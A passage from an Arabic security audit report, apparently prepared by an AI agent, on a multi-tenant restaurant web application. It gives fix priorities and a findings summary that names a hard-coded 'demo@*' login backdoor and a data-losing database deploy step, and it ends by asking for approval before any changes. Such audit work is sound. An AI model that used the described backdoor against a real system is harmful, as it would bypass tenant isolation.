1. **C-01 حذف باب `demo@*`** — الملف `server/routes/auth.ts:59-118` — حذف 40 سطراً، بدون بديل، مع اختبار `AU-02`.
2. **C-02 إزالة `--accept-data-loss`** — 3 ملفات: `Dockerfile:35` → `prisma migrate deploy`، `package.json:9-10` حذف `prisma db push`، `render.yaml:5` → `migrate deploy`. إضافة مجلد `prisma/migrations` وخطوة CI `npx prisma migrate diff`.
3. **تدوير `JWT_SECRET`** (عملياً إبطال التوكنات القديمة عبر `prisma restaurantUser updateMany {tokenVersion: increment 1}` أو تغيير السر وتسجيل خروج إجباري) — يتم بعد الحذف مباشرة.
4. **إعادة تشغيل `security-tests/api-security-smoke.mjs`** على DB مؤقتة (PostgreSQL 17) مع مستأجرين اصطناعيين — يجب أن تكون 47/47 ✅ كما في `SECURITY_FIXES_APPLIED_2026-09-07.md:§5`، لكن مع رفض `demo` الآن.

*لا يُسمح بأي P1 قبل إغلاق P0. P0 لا يغير UI/UX ولا يكسر وظائف Tenant الشرعيين (الحسابات الحقيقية تعمل كما هي).*

### P1 — قبل أول دفع/اشتراك حقيقي

- H-01 → خارطة انتقال HttpOnly (تقدير: 3-5 أيام)
- H-02 → تقصير JWT إلى 12h مؤقتاً حتى اكتمال H-01
- H-03 → Redis store للـ rate limits + محددات إضافية (`onboard`, `payment`, `status`)
- M-01 → Pagination لكل قوائم manager
- M-06 → فحص كلمات مسربة + MFA للمنصة
- (اختياري لكن مُستحسن) M-02 تصغير `/health`، M-07 Decimal

### P2 — تقوية واستدامة

- M-03 قيود DB المركبة + مراجعة CI `prisma validate`
- M-04 تقليل polling والاعتماد على SSE
- M-05 ترقية Prisma 5→7 مجدولة
- L-02 استبدال `unsafe-inline` بـ nonce، L-04 تنظيف uploads، I-01 RLS مستقبلي

**التزام بصري:** لا تغيير للألوان/الخطوط/العلامة التجارية/التصميم أثناء كل هذه الإصلاحات — كما هو مطلوب في §31.

---

## 14) النتائج النهائية حسب §32

```
SECURITY AUDIT SUMMARY — 2026-09-08

Security Score: 68/100

Critical:       2
High:           4
Medium:         7
Low:            4
Informational:  3

Critical Findings
  C-01 demo@* backdoor — ACTIVE (blocks launch)
  C-02 db push --accept-data-loss — ACTIVE (blocks launch)

High Findings
  H-01 localStorage JWT — mitigated by CSP/escape but needs HttpOnly roadmap
  H-02 7-day JWT without refresh rotation
  H-03 in-memory rate limiting + partial coverage
  H-04 render build still uses db push (same root as C-02)

Medium Findings
  M-01 unbounded lists, M-02 health fingerprint, M-03 no composite FK,
  M-04 1.5s polling, M-05 outdated Prisma, M-06 no breached-password check,
  M-07 Float money

Low Findings
  L-01 CSRF not applicable (yet), L-02 unsafe-inline, L-03 verbose console.error,
  L-04 uploads retention

Multi-Tenant Isolation Result
  PASS (conditional — FAIL until C-01 removed)
  الاختبارات المنفذة: 12 read isolation + 3 mutation + QR capability checks
  كلها 403/404 عدا مسار demo الذي يمنح عضوية شرعية جديدة (C-01)

Authentication Result
  FAIL → PASS after P0
  المصادقة الحالية صحيحة (bcrypt, JWT HS256+iss/aud+jti, tokenVersion, DUMMY_HASH, rateLimit, fail-closed) باستثناء C-01

Authorization Result
  PASS
  RBAC خادمي كامل على كل عمليات الكتابة، مع last-manager protection ومنع ترقية ذاتية

API Security Result
  PASS
  BOLA/BFLA مغلق، Mass Assignment محمي بـ strict zod، Pricing خادمي، Method tampering 404/405، Rate limits على المسارات الحرجة

Database Security Result
  PASS
  لا raw SQL، لا حقن، مراجعات ملكية، لكن بلا RLS/قيود مركبة (M-03)

Secrets Exposure Result
  FAIL (بسبب C-01)
  لا أسرار في Frontend bundle، لا VITE secrets، لا fallback JWT، لكن كلمات demo السحرية تعتبر hard-coded credentials

Production Security Result
  FAIL (بسبب C-02)
  Helmet+CSP+CORS fail-closed+Upload hardening صحيحة، لكن مسار النشر يحمل سلاح فقدان بيانات

Overall: NO-GO للإطلاق العام. GO لإطلاق staging محدود على بيانات اصطناعية فقط بعد P0 (تقدير جهد: < 1 يوم).
```

### الحكم التفصيلي للنقاط 33/§32

| البند | النتيجة | الشرح |
|---|---|---|
| Restaurant A → Restaurant B data/orders/tables/menu/settings/dashboard/QR/customer | **PASS*** | محمي بـ JWT-first + ownTenant، *يلغيه C-01 |
| User A → User B انتحال | **PASS** | لا يمكن تغيير `id` في JWT، و `req.user.id` من DB check + tokenVersion |
| Staff → Manager → Owner → Admin | **PASS** | لا ترقية عبر tenant routes، منصّات فقط للمنصة |
| Public → Private Data | **PASS** | Public DTOs محدودة، لا hashes/tokens، و `/admin` محمي |
| QR Token → Admin | **PASS** | QR قدرة جلسة فقط، لا يمنح دوراً، وتنتهي 6h وتُبطل عند التدوير |
| Frontend bypass للـ Backend | **PASS** | لا hidden route كآلية أمنية؛ كل حماية خادمية |
| تحكم في Tenant/User/Resource ID لإجبار الوصول | **PASS*** | IDs من URL/Query/Body تُتجاهل لغير المنصة، *يلغيه C-01 عبر إنشاء عضوية جديدة |

---

## 15) ملاحظات ختامية للمُمهِّد للإطلاق (Launch Readiness)

1. **لا تعتبر غياب الدليل دليل أمان** — هذا التقرير مبني على أدلة سطرية، لا على "يبدو آمناً".
2. **`SECURITY_FIXES_APPLIED_2026-09-07.md` دقيق في معظمه** — لكن تدقيقه لم يلتقط بقاء كود `demo@*` في هذا الفرع (`arena/01a07feb` مبني من `89c9997`، بينما الإصلاحات كانت في `arena/01a07a7b`). يجب مزامنة الفرعين قبل الدمج.
3. **بعد موافقتك على التقرير، سأطبق إصلاحات P0 فقط** (حذف demo + تنظيف db push + تدوير سر) وأعيد تشغيل `npm run build` و `npm test` و `security-tests/api-security-smoke.mjs` على DB مؤقتة، ثم أسلّم diff للمراجعة البشرية.
4. **لا تغيير بصري** سيُطبق — الالتزام بالألوان/الخطوط/العلامة كما هي.
5. **الخطوة التالية المطلوبة منك:** الموافقة على التقرير واختيار موعد تدوير `JWT_SECRET` (يتطلب تسجيل خروج إجباري لكل المستخدمين الحاليين).

---

## 16) المرفقات ومراجع سريعة

- **الملفات المفحوصة كاملة:** `server/{index,config,middleware/auth,rateLimit,routes/{auth,manager,admin,public,uploads},validation/schemas,utils/security,services/{audit,realtime,backup},types/express,db/{prisma,seed,provision-admins}}` + `src/{services/api,context/*,components/manager/*,utils/formatting}` + `prisma/schema.prisma` + `Dockerfile` + `docker-compose.yml` + `render.yaml` + `vercel.json` + `netlify.toml`
- **أوامر قابلة لإعادة المراجعة:**
  ```bash
  npm audit --json          # 0 vulnerabilities
  npm run build             # يبني Vite frontend فقط — لا يفحص server TS (tsconfig.app.json لا يشمل server/)
  npm run lint              # 0 errors, 156 warnings (كما في التقرير السابق)
  grep -R "executeRaw|queryRaw" server/  # لا نتائج
  grep -R "dangerouslySetInnerHTML|innerHTML" src/  # لا نتائج
  grep -R "VITE_" src/  # فقط VITE_API_URL (public)
  ```
- **اختبارات تكميلية موصى بها قبل الإطلاق:** تشغيل `security-tests/api-security-smoke.mjs` على PostgreSQL 17 مؤقتة + `npx prisma validate` + `npm test` (29 passed / 1 skipped كخط أساس) + مراجعة يدوية لـ `prisma migrate diff`.

---

*أُعدّ هذا التقرير من الشفرة المصدرية الفعلية ونتائج البحث الآلي المباشرة — لا من التخمين. إذا لم أستطع إثبات وجود حماية، اعتبرتها "Security Control Not Verified" بدل افتراض الأمان. بعد موافقتك، سأباشر إصلاحات P0 ثم أعيد التدقيق التراجعي (Security Regression) على المحاور الـ 13 المذكورة في §30.*
